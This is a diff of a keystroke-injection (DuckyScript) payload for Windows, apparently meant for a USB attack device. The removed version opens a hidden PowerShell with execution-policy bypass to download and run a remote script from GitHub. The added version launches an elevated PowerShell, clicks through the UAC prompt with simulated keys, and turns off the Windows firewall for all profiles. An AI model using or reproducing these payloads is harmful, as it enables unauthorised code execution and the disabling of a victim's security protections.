@@ -1,14 +1,24 @@
 REM ###########################################################
 REM #                                                         |
-REM # Title        : Windows Close All Apps                   |
+REM # Title        : Disable Windows FireWall                 |
 REM # Author       : Zenin                                    |
 REM # Version      : 1.0                                      |
 REM # Category     : Execution                                |
 REM # Target       : Windows                                  |
 REM #                                                         |
 REM ###########################################################
-
-DELAY 2000
-GUI r
-DELAY 250
-STRINGLN  powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1?token=GHSAT0AAAAAACJCV62V5JRTVENW2PIGRDAKZJVSH5A').Content"
+DELAY 750
+WINDOWS d
+DELAY 850
+WINDOWS r
+DELAY 900
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING netsh advfirewall set allprofiles state off; exit
+ENTER
